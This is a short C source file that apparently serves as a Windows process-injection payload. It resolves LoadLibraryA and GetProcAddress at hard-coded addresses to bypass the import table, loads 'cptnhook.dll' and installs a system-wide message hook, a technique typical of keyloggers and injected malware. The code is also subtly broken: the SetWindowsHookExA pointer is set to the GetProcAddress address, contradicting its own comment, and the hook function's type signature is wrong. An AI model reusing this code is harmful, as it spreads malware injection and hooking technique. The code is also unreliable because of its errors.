#include "windows.h"
int main (){return 99;}
DWORD WINAPI InjectMe(LPVOID lpParameter){
	typedef HMODULE(*_LoadLibrary)(LPCSTR);
	typedef FARPROC(*_GetProcAddress)(HMODULE,LPCSTR);
	typedef FARPROC(*_SetWindowsHookEx)(HMODULE,LPCSTR);

	char hookProc[] = {'H','o','o','k','P','r','o','c',NULL};
	char cpnHook[] = { 'c','p','t','n','h','o','o','k','.','d','l','l',NULL };

	_LoadLibrary ll;
	HMODULE hMod;
	_GetProcAddress gpa;
	HOOKPROC installProc;
	_SetWindowsHookEx swh;

	//0x7c801d7b - LoadLibraryA - Skip IAT
	ll = (_LoadLibrary)0x7c801d7b;
	hMod = ll(cpnHook);
	if (NULL == hMod){
		return -1;
	}

	//0x7c80ae40 - GetProcAddress - Skip IAT
	gpa = (_GetProcAddress)0x7c80ae40;

	installProc = (HOOKPROC)gpa(hMod,hookProc);
	if (NULL == installProc){
		return -1;
	}

	//0x7e431211 - SetWindowsHookExA - Skip IAT
	swh = (_SetWindowsHookEx)0x7c80ae40;
	swh(WH_GETMESSAGE, installProc, hMod, 0);
}